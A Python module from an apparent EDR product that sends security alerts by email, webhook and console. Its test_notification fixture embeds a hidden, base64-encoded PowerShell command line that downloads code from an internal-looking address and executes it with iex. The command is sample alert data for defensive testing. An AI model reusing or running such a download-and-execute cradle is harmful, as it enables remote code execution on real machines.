"""
Alert Notification System for EDR.
Handles distribution of alerts to various destinations (email, SIEM, webhooks, etc.)
"""
import smtplib
import json
import logging
from typing import Dict, List, Optional, Any, Union
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import requests
from datetime import datetime

from .alert_manager import Alert

class NotificationMethod:
    """Base class for notification methods."""
    
    def send(self, alert: Alert, config: Dict[str, Any]) -> bool:
        """Send a notification for the given alert."""
        raise NotImplementedError

class EmailNotifier(NotificationMethod):
    """Send alerts via email."""
    
    def send(self, alert: Alert, config: Dict[str, Any]) -> bool:
        """Send an email notification for the alert."""
        try:
            # Create message
            msg = MIMEMultipart()
            msg['From'] = config.get('from', 'edr-alerts@example.com')
            msg['To'] = ', '.join(config.get('to', []))
            msg['Subject'] = f"[{alert.priority}] {alert.name}"
            
            # Create email body
            body = f"""
            Security Alert: {alert.name}
            {'=' * 50}
            
            Description: {alert.description}
            
            Severity: {alert.severity}/10
            Priority: {alert.priority}
            Confidence: {alert.confidence * 100:.1f}%
            
            Timestamp: {alert.timestamp}
            Alert ID: {alert.alert_id}
            
            MITRE ATT&CK:
            """
            
            if alert.tactic:
                body += f"  - Tactic: {alert.tactic.get('name')} ({alert.tactic.get('id')})\n"
            if alert.technique:
                body += f"  - Technique: {alert.technique.get('name')} ({alert.technique.get('id')})\n"
            if alert.subtechnique:
                body += f"  - Sub-technique: {alert.subtechnique.get('name')} ({alert.subtechnique.get('id')})\n"
            
            # Add context information
            if alert.context.process:
                body += f"\nProcess Information:\n"
                body += f"  - Name: {alert.context.process.get('name', 'N/A')}\n"
                body += f"  - PID: {alert.context.process.get('pid', 'N/A')}\n"
                body += f"  - Command Line: {alert.context.process.get('command_line', 'N/A')}\n"
            
            if alert.context.network:
                body += f"\nNetwork Information:\n"
                body += f"  - Source: {alert.context.network.get('source_ip', 'N/A')}:{alert.context.network.get('source_port', 'N/A')}\n"
                body += f"  - Destination: {alert.context.network.get('dest_ip', 'N/A')}:{alert.context.network.get('dest_port', 'N/A')}\n"
                body += f"  - Protocol: {alert.context.network.get('protocol', 'N/A')}\n"
            
            if alert.indicators:
                body += "\nIndicators of Compromise (IOCs):\n"
                for ioc in alert.indicators[:5]:  # Limit to first 5 IOCs
                    body += f"  - {ioc.get('type')}: {ioc.get('value')}\n"
                if len(alert.indicators) > 5:
                    body += f"  - ... and {len(alert.indicators) - 5} more indicators\n"
            
            # Add a link to the alert in the EDR console if available
            if config.get('console_url'):
                body += f"\nView in EDR Console: {config['console_url'].rstrip('/')}/alerts/{alert.alert_id}\n"
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Send email
            with smtplib.SMTP(config['smtp_server'], config.get('smtp_port', 25)) as server:
                if config.get('use_tls', True):
                    server.starttls()
                if 'username' in config and 'password' in config:
                    server.login(config['username'], config['password'])
                server.send_message(msg)
            
            return True
            
        except Exception as e:
            logging.error(f"Failed to send email notification: {e}")
            return False

class WebhookNotifier(NotificationMethod):
    """Send alerts to a webhook (e.g., SIEM, SOAR, Slack, etc.)."""
    
    def send(self, alert: Alert, config: Dict[str, Any]) -> bool:
        """Send alert to a webhook."""
        try:
            headers = {
                'Content-Type': 'application/json',
                'User-Agent': 'EDR-Alert-Notifier/1.0'
            }
            
            # Add authentication if configured
            if 'auth_token' in config:
                if config.get('auth_type', 'bearer').lower() == 'bearer':
                    headers['Authorization'] = f"Bearer {config['auth_token']}"
                elif config.get('auth_type').lower() == 'api_key':
                    headers[config.get('api_key_header', 'X-API-Key')] = config['auth_token']
            
            # Prepare alert data
            alert_data = {
                'alert_id': alert.alert_id,
                'name': alert.name,
                'description': alert.description,
                'severity': alert.severity,
                'priority': alert.priority,
                'confidence': alert.confidence,
                'timestamp': alert.timestamp,
                'status': alert.status.value,
                'source': alert.source,
                'tactic': alert.tactic,
                'technique': alert.technique,
                'subtechnique': alert.subtechnique,
                'context': {
                    'process': alert.context.process,
                    'network': alert.context.network,
                    'file': alert.context.file,
                    'registry': alert.context.registry,
                    'user': alert.context.user,
                    'endpoint': alert.context.endpoint
                },
                'indicators': alert.indicators,
                'tags': alert.tags,
                'metadata': alert.metadata
            }
            
            # Send to webhook
            verify_ssl = config.get('verify_ssl', True)
            timeout = config.get('timeout', 10)
            
            response = requests.post(
                config['url'],
                json=alert_data,
                headers=headers,
                verify=verify_ssl,
                timeout=timeout
            )
            
            if response.status_code >= 400:
                logging.error(f"Webhook request failed with status {response.status_code}: {response.text}")
                return False
                
            return True
            
        except Exception as e:
            logging.error(f"Failed to send webhook notification: {e}")
            return False

class ConsoleNotifier(NotificationMethod):
    """Log alerts to console (for debugging purposes)."""
    
    def send(self, alert: Alert, config: Dict[str, Any] = None) -> bool:
        """Log alert to console."""
        try:
            print(f"\n{'=' * 80}")
            print(f"ALERT: {alert.name}")
            print(f"Severity: {alert.severity}/10, Priority: {alert.priority}")
            print(f"Timestamp: {alert.timestamp}")
            print(f"Description: {alert.description}")
            
            if alert.technique:
                print(f"MITRE: {alert.technique.get('name')} ({alert.technique.get('id')})")
            
            if alert.context.process:
                print(f"\nProcess: {alert.context.process.get('name')} (PID: {alert.context.process.get('pid')})")
                print(f"Command: {alert.context.process.get('command_line', 'N/A')}")
            
            if alert.indicators:
                print("\nIndicators:")
                for ioc in alert.indicators[:5]:
                    print(f"  - {ioc.get('type')}: {ioc.get('value')}")
                
            print(f"{'=' * 80}\n")
            return True
            
        except Exception as e:
            logging.error(f"Failed to log alert to console: {e}")
            return False

class NotificationManager:
    """Manages alert notifications across multiple channels."""
    
    def __init__(self, config: Dict[str, Any]):
        """Initialize the notification manager."""
        self.config = config
        self.logger = logging.getLogger('edr.notifications')
        self.notifiers = self._initialize_notifiers()
    
    def _initialize_notifiers(self) -> Dict[str, NotificationMethod]:
        """Initialize notifiers based on configuration."""
        notifiers = {}
        
        # Initialize email notifier if configured
        if self.config.get('email', {}).get('enabled', False):
            notifiers['email'] = EmailNotifier()
        
        # Initialize webhook notifiers if configured
        if self.config.get('webhook', {}).get('enabled', False):
            notifiers['webhook'] = WebhookNotifier()
        
        # Always enable console notifier for debugging
        notifiers['console'] = ConsoleNotifier()
        
        return notifiers
    
    def send_notification(self, alert: Alert) -> Dict[str, bool]:
        """
        Send notification for an alert through all configured channels.
        
        Returns:
            Dict[str, bool]: Mapping of notification channel to success status
        """
        results = {}
        
        # Send email notification if configured
        if 'email' in self.notifiers and self.config.get('email', {}).get('enabled', False):
            results['email'] = self.notifiers['email'].send(alert, self.config['email'])
        
        # Send webhook notification if configured
        if 'webhook' in self.notifiers and self.config.get('webhook', {}).get('enabled', False):
            results['webhook'] = self.notifiers['webhook'].send(alert, self.config['webhook'])
        
        # Always log to console for debugging
        if 'console' in self.notifiers:
            results['console'] = self.notifiers['console'].send(alert, {})
        
        return results
    
    def test_notification(self) -> Dict[str, bool]:
        """Send a test notification through all configured channels."""
        from dataclasses import asdict
        from .alert_manager import Alert, AlertContext
        
        # Create a test alert
        test_alert = Alert(
            alert_id="test_alert_123",
            timestamp=datetime.utcnow().isoformat() + 'Z',
            name="Test Alert",
            description="This is a test alert to verify notification channels.",
            severity=5,
            status='new',
            confidence=0.9,
            source='edr_test',
            tactic={
                'id': 'TA0002',
                'name': 'Execution',
                'severity': 7,
                'priority': 'High'
            },
            technique={
                'id': 'T1059',
                'name': 'Command-Line Interface',
                'description': 'Adversaries may use command-line interfaces for execution.'
            },
            context=AlertContext(
                process={
                    'name': 'powershell.exe',
                    'pid': 1234,
                    'command_line': 'powershell -nop -w hidden -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAJwAnACcAKQApADsAJABzAC4AUABvAHMAaQB0AGkAbwBuAD0AMAA7ACQAYgA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABCAHkAdABlAFsAXQAgADYANQA1ADMANAA7ACQALgAoACcAYwBvAG4AdgBlACcAKwAnAHQAIABmAHIAbwBtACcAKwAnACAAYgB5AHQAZQAnACkALgBJAG4AdgBvAGsAZQAoACQALgAoACcATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAJwApAC4ALgAoACcARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAJwApACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAwADoAOAAwADgAMAAvAGkAbgBkAGUAeAAuAGEAcwBwACcAKQAsAFsAYgB5AHQAZQBbAF0AXQAxACwAJABiAC4ATABlAG4AZwB0AGgAKQA7ACQAYgA9ACQALgAoACcAbgBlAHcALQBvAGIAagBlAGMAdAAnACsAJwAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAJwApAC4ALgAoACcARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAJwApACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAwADoAOAAwADgAMAAvAGkAbgBkAGUAeAAuAGEAcwBwACcAKQA7ACQALgAoACcAaQBlAHgAJwApACgAJAAuACgAJwB0AGUAeAAnACsAJwB0ACcAKwAnACcAKwAnAC4AcwB0AHIAaQBuAGcAJwApAC4ASQBuAHYAbwBrAGUAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAC4AKAAkAGIAKQApACkA',
                    'integrity_level': 'High',
                    'parent_name': 'explorer.exe',
                    'parent_pid': 123,
                    'user': 'DOMAIN\\testuser',
                    'session_id': 1
                },
                network={
                    'source_ip': '192.168.1.100',
                    'source_port': 49234,
                    'dest_ip': '192.168.1.1',
                    'dest_port': 443,
                    'protocol': 'TCP',
                    'direction': 'outbound'
                }
            ),
            indicators=[
                {'type': 'command_line', 'value': 'powershell -nop -w hidden -e ...', 'description': 'Suspicious PowerShell command line'},
                {'type': 'ip', 'value': '192.168.1.100', 'description': 'Internal IP address'},
                {'type': 'domain', 'value': 'example.com', 'description': 'Suspicious domain'}
            ],
            tags=['test', 'powershell', 'suspicious_activity']
        )
        
        # Send test notification
        return self.send_notification(test_alert)
